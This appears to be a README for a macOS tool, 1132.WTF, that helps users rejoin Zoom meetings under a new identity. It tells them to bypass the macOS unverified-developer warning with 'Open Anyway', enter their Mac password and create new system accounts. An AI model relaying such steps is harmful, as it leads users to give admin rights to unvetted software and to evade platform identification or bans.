1132.WTF
========

Do these three things. Stop when you are in the meeting.

STEP 1 - Right-click INSTALL_TO_APPLICATIONS.command
         Click Open. Click Open again.

STEP 2 - In the list, click:
         STEP 1 - Fix Zoom
         Click Run.

LAUNCH - When it asks:
         STEP 1 - Type a name that is NOT your old name. Example: Guest
         STEP 2 - Type the meeting number (or leave blank)
         Click LAUNCH.

Zoom opens empty. Join. Do not sign in as the old account.


If macOS says the author cannot be verified
-------------------------------------------

STEP 1 - Click Done (not Move to Trash).

STEP 2 - Open System Settings → Privacy & Security.
         Scroll down. Click Open Anyway.

LAUNCH - Open 1132.WTF from Applications.


If STEP 1 still shows your old name
-----------------------------------

STEP 1 - In 1132.WTF, click STEP 2 - Deep fix. Click Run.

STEP 2 - Type your Mac password. Write down the new account and password.

LAUNCH - Click Switch now. Log in as that new account. Open Zoom there.

Do not stay on this login. Deleting those accounts does nothing.


If that still fails
-------------------

STEP 1 - In 1132.WTF, click STEP 3 - Join in browser.

STEP 2 - Paste the meeting link.

LAUNCH - Click Open. Join from the browser. Do not sign in as the old account.
